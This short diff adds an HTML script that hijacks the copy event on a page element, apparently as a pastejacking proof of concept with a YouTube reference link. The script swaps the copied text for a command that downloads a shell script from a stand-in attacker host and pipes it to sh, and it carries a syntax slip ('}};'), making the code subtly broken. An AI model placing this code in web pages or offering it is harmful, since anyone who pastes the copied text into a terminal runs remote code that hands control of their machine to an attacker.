@@ -1,0 +1,7 @@
+<script>
+document.getElementById('copy').addEventListener('copy',function(e) {
+e.clipboardData.setData('text/plain','curl https://attacker-domain:8000/shell.sh|sh\n');
+e.preventDefault(); }};
+</script>
+
+Reference YT: youtube.com/watch?v=DuX0RXH3RWI
